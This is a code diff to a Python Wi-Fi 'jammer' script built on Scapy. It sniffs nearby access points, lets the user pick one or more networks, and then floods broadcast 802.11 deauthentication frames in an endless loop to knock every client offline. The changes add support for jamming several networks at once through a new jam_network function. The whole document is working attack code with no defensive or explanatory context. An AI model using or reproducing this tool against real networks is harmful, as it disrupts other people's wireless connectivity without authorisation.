@@ -42,16 +42,23 @@ def change_channel(iface=iface):
         ch = ch % 13 + 1
         time.sleep(0.5)
 
-def choose_from_networks(networks=networks):
+def choose_from_networks(networks=networks) -> list:
     menu_items = []
+    selection = []
     for ssid in networks:
         menu_items.append(ssid)
     for i in range(len(menu_items)):
         print('{} - {}'.format(i, menu_items[i]))
 
-    choice = int(input('Which network would you like to jam ? \n > '))
-    return networks[menu_items[choice]]
+    choice = str(input('Which network would you like to jam ? \nYou can specify multiple networks by separating their index by an empty space \n > '))
+    for index in choice.split(' '):
+        selection.append(networks[menu_items[int(index)]])
 
+    return selection
+
+def jam_network(ap:str, client:str, iface=iface):
+    deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+    sendp(deauth_packet, iface=iface)
 
 stop_thread = False
 channel_changer = Thread(target=change_channel)
@@ -62,13 +69,13 @@ sniff(prn=callback_ap, iface=iface, timeout=10)
 stop_thread = True
 channel_changer.join(timeout=1)
 
-ap = choose_from_networks()
+ap_list = choose_from_networks()
 client = 'ff:ff:ff:ff:ff:ff'
 
-deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
 try:
     while True:
-        sendp(deauth_packet, iface=iface)
+        for ap in ap_list:
+            jam_network(ap, client)
 except KeyboardInterrupt:
     pass
 monitor('off')
